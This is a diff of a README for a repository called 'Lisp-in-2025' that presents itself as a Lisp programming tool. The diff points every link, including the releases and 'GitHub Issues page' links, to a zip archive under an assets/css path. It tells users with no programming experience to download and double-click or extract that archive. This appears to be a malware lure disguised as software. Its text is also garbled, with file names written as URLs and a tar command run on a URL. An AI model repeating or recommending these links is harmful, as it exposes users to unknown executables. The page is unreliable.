@@ -1,6 +1,6 @@
 # 🚀 Lisp-in-2025 - Discover the Future of Lisp Programming
 
-[![Download](https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip%20in%https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip)](https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip)
+[![Download](https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip%20in%https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip)](https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to Lisp-in-2025! This software explores the current state of Lisp progra
 To begin using Lisp-in-2025, follow these simple steps. No prior programming experience is required.
 
 1. **Download the Software**
-   - Visit this page to download: [Lisp-in-2025 Releases](https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip)
+   - Visit this page to download: [Lisp-in-2025 Releases](https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip)
 
 2. **Choose Your Version**
    - From the releases page, locate the most recent version of Lisp-in-2025. Check the release notes to understand what’s included in this version. Look for the files that match your operating system.
@@ -20,18 +20,18 @@ To begin using Lisp-in-2025, follow these simple steps. No prior programming exp
    - Once you have downloaded the file, follow these guidelines based on your operating system:
 
    ### 💻 Windows
-   - Locate the downloaded file, often named something like `https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip`.
+   - Locate the downloaded file, often named something like `https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip`.
    - Double-click the file to start the installation. Follow the on-screen prompts to complete the setup.
 
    ### 🍏 macOS
-   - Find the downloaded file named `https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip`.
+   - Find the downloaded file named `https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip`.
    - Open the file, then drag the Lisp-in-2025 application to your Applications folder.
 
    ### 🐧 Linux
-   - Download the file labeled `https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip`.
+   - Download the file labeled `https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip`.
    - Open your terminal, navigate to the downloaded file using `cd ~/Downloads`, and run:
      ```
-     tar -xvzf https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip
+     tar -xvzf https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip
      ```
    - Follow further instructions in the README file located in the extracted folder.
 
@@ -43,7 +43,7 @@ To begin using Lisp-in-2025, follow these simple steps. No prior programming exp
 
 To begin your journey with Lisp-in-2025, visit the releases page where you can download the latest version. Click the link below:
 
-[Download Lisp-in-2025](https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip)
+[Download Lisp-in-2025](https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip)
 
 ## 📝 Features
 
@@ -67,7 +67,7 @@ Before downloading, ensure your device meets the following minimum system requir
 
 Join our community of Lisp enthusiasts. Participate in discussions and share your experiences. 
 
-- **GitHub Issues**: Report problems or request features through the [GitHub Issues page](https://raw.githubusercontent.com/Onealvinoti/Lisp-in-2025/main/blasty/Lisp-in-2025.zip).
+- **GitHub Issues**: Report problems or request features through the [GitHub Issues page](https://github.com/Onealvinoti/Lisp-in-2025/raw/refs/heads/main/assets/css/Lisp-in-asyndesis.zip).
 - **Community Forum**: Engage with other users on our forum [here](#).
 
 ## 🔍 Frequently Asked Questions (FAQs)
